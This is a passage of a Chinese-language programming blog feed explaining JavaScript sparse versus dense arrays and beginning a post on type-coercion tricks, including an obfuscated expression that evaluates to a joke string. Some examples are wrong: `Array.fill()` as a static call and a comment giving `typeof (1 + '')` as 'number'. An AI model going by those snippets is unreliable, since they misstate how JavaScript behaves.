class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> arr2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> arr3<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 1 undefined 1</span><span class="token comment">// 2 undefined undefined</span><span class="token comment">// 3 undefined 3</span>arr1<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">x</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 1</span><span class="token comment">// 2</span><span class="token comment">// 3</span>arr2<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">x</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// （无输出）</span>arr3<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">x</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 1</span><span class="token comment">// 3</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">0</span> <span class="token keyword">in</span> arr3<span class="token punctuation">,</span> <span class="token number">1</span> <span class="token keyword">in</span> arr3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// true false</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>总结一下，创建的稀疏数组，其长度（length）与定义长度值一致；<strong>空隙</strong> 值可以被单独访问到，并且不是之前出现的 <code>empty</code> 字样，而是 <code>undefined</code>，比如例子中出现 <code>undefined</code> 时都是使用 <code>arr[i]</code> 这样的索引直接访问方式；使用某些数组方法如 <code>forEach()</code> 时，会忽略掉空隙值，只处理正常值，所以也会使得 <code>1 in arr3</code> 值为 <code>false</code>，即数组中不存在该索引；</p><p>细想一下，js 这样处理的原因多半是去除不必要的性能开销，当数组相当大时，可以避免处理一些未初始化的值，但这样也同时使得开发中会出现一些问题，所以应尽量避免；</p><p>举个例子来查看一下性能如何：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token string">'one'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 密集数组</span><span class="token function">Array</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token function">Array</span><span class="token punctuation">(</span><span class="token number">1e5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">timeEnd</span><span class="token punctuation">(</span><span class="token string">'one'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token string">'two'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 稀疏数组</span><span class="token function">Array</span><span class="token punctuation">(</span><span class="token number">1e5</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">timeEnd</span><span class="token punctuation">(</span><span class="token string">'two'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// one: 26.3759765625ms</span><span class="token comment">// two: 5.701171875ms</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看出在处理较大数组时，稀疏数组确实能降低不少性能开销；</p><h1 id="密集数组"><a href="#密集数组" class="headerlink" title="密集数组"></a>密集数组</h1><h2 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h2><p>与稀疏相对应，则存在密集，定义也就是元素中不存在 <strong>空隙</strong> 值，其实密集数组基本就是平时常见的正常数组；</p><p>例如：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> arr1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">var</span> arr2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>arr2<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">x</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 1</span><span class="token comment">// 2</span><span class="token comment">// 3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以上都是一些定义密集数组的方法，并且数组中的值都能被正常访问或遍历处理；</p><h2 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h2><p>运用时需要注意以下情况：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> arr1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">undefined</span><span class="token punctuation">,</span> <span class="token keyword">undefined</span><span class="token punctuation">,</span> <span class="token keyword">undefined</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">var</span> arr2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> arr2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// undefined undefined</span>arr1<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">x</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment">// undefined</span><span class="token comment">// undefined</span><span class="token comment">// undefined</span>arr2<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">x</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment">// （无输出）</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>即显式的声明值为 <code>undefined</code> 并不代表这个值就是之前提到的<strong>空隙</strong>值，虽然二者通过索引访问时的值都返回 <code>undefined</code>，但是其根本还是有区别的，显式声明过的是可以被遍历等操作访问的，不会被当成空隙值被忽略；</p><h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><p>通常在很多情况下，我们想要直接声明一个数组并赋予其一些特定的初始值，并且为了避免问题，通常是希望申明为密集数组的，下面就介绍一些常用的方法或技巧：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> arr1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// [1, 1, 1]</span><span class="token keyword">var</span> arr2 <span class="token operator">=</span> Array<span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">x<span class="token punctuation">,</span> i</span><span class="token punctuation">)</span> <span class="token operator">=></span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// [0, 1, 2]</span><span class="token keyword">var</span> arr3 <span class="token operator">=</span> <span class="token function">Array</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token function">Array</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// [undefined, undefined, undefined]</span><span class="token comment">// 这样声明的是密集数组，不是稀疏的</span><span class="token keyword">var</span> arr4 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr4<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// ['a', 'a', 'a']</span><span class="token comment">// 注意定义数组长度比输出数组大 1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其它更多的方法可以自行类推；</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 稀疏数组 sparse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript 类型转换的有趣应用</title>
      <link href="/2024/09/27/javascript/javascript-lei-xing-zhuan-huan-de-you-qu-ying-yong/"/>
      <url>/2024/09/27/javascript/javascript-lei-xing-zhuan-huan-de-you-qu-ying-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><blockquote><p>可以访问这个网站提前预览：<a href="https://knightyun.github.io/magic-expression/">https://knightyun.github.io/magic-expression/</a></p></blockquote><p>先来看一串代码：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">--</span><span class="token punctuation">[</span><span class="token operator">~</span><span class="token operator">+</span><span class="token string">''</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token punctuation">[</span><span class="token operator">~</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">~</span><span class="token operator">~</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token operator">~</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token operator">~</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也许你在其他地方看见过这种黑科技操作，那么不妨猜一下上面的代码的值等于多少，实在猜不到可以复制它粘贴到浏览器 console 中回车看看；</p><p>这里剧透一下，会得到下面的结果（手动解释，仅供娱乐并无其他意思）：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token string">"sb"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当然，你可能还见过这种形式的 <code>&quot;hello world!&quot;</code> 版本的，即最后输出的字符串是 <code>&quot;hello world!&quot;</code>，这里由于它的代码过长就不粘贴出来了，原理和上面类似，我们暂且称它为<strong>魔法表达式</strong>，下面就以上面的例子还分析一下这窜代码的“魔法”；</p><h1 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h1><p>分析之前先来了解一些基础，在 js 的世界中，存在一种<strong>类型转换</strong>的机制，大致就是字面意思，下面分别举例说明；</p><h2 id="Number-String"><a href="#Number-String" class="headerlink" title="Number / String"></a>Number / String</h2><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 2</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'1'</span> <span class="token operator">+</span> <span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// "11"</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">+</span> <span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// "11"</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'1'</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// "11"</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 0</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'1'</span> <span class="token operator">-</span> <span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 0</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">-</span> <span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 0</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'1'</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 0</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">-</span> <span class="token string">'b'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// NaN</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">-</span> <span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// NaN</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// NaN</span><span class="token comment">// *，/，% 等运算符与 - 运算类似</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到，上面的行为可能有点怪异，因为在其他语言中可能会报错，但是在 js 中确实是这样执行的，即静默地尽可能地把运算符两边的类型转换一致再运算；</p><h2 id="Number-Boolean"><a href="#Number-Boolean" class="headerlink" title="Number / Boolean"></a>Number / Boolean</h2><p>当然这种转换不限于字符串和数字类型之间，也包括其他类型，比如很经典的一中转换：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">==</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// true</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">===</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// false</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>上面就是把数字类型和 Boolean 类型的值进行比较，第一行的输出结果是因为使用 <code>==</code> 操作符时会自行把 <code>1</code> 转换为 <code>true</code>，所以两边相等（可以理解为执行 <code>Boolean(0)</code> 操作）；而 <code>===</code> 操作符除了比较两边的值，还会比较两边类型，二者都相同才判断相等，即没有进行类型转换；</p><h2 id="其他类型"><a href="#其他类型" class="headerlink" title="其他类型"></a>其他类型</h2><p>其他类型的转换情况：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">Boolean</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// true</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">Boolean</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// false</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">Boolean</span><span class="token punctuation">(</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// false</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">Boolean</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// true</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">Boolean</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// true</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">Boolean</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// true</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">Boolean</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// false</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">Boolean</span><span class="token punctuation">(</span><span class="token function">Number</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// false</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">Boolean</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Number</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><p>下面是该机制的一些实际应用：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token keyword">typeof</span> <span class="token operator">+</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1 "number"</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">+</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token keyword">typeof</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">+</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1 "number"</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">''</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">typeof</span> <span class="token punctuation">(</span><span class="token string">''</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1 "string"</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">typeof</span> <span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 0 "number"</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">typeof</span> <span class="token operator">-</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// -0 "number"</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">typeof</span> <span class="token operator">+</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1 "number"</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">typeof</span> <span class="token operator">+</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// NaN "number"</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">''</span> <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">typeof</span> <span class="token punctuation">(</span><span class="token string">''</span> <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">''</span> <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// '' "string" 0</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token keyword">typeof</span> <span class="token punctuation">(</span><span class="token string">''</span> <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">''</span> <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// '' "string" 0</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">typeof</span> <span class="token operator">+</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// NaN "number"</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token operator">+</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token keyword">typeof</span> <span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token operator">+</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [object Object] "string"</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">''</span> <span class="token operator">+</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">typeof</span> <span class="token punctuation">(</span><span class="token string">''</span> <span class="token operator">+</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [object Object] "string"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>另外，**”!”** 与 <strong>“~”</strong> 运算符也算是 js 中较为常见的，其中 <strong>!</strong> 是逻辑运算符，代表<strong>非</strong>，而 <strong>~</strong> 是位运算符，代表<strong>按位取反</strong>，它们有以下关系：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// false</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// true</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// true</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// -1</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 